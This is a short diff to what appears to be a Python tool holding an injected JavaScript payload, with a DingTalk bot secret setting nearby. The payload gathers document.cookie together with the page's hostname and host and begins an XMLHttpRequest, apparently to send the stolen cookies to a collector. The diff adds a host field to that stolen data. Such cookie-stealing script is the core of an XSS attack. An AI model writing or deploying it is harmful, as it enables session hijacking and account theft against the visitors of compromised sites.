@@ -15,7 +15,8 @@ dingtalk_bot_secret = ""
 js = """(function () {
     let a = {
         cookie: document.cookie,
-        host : window.location.hostname
+        hostname : window.location.hostname,
+        host : window.location.host
     }
 
     let xhr = new XMLHttpRequest;
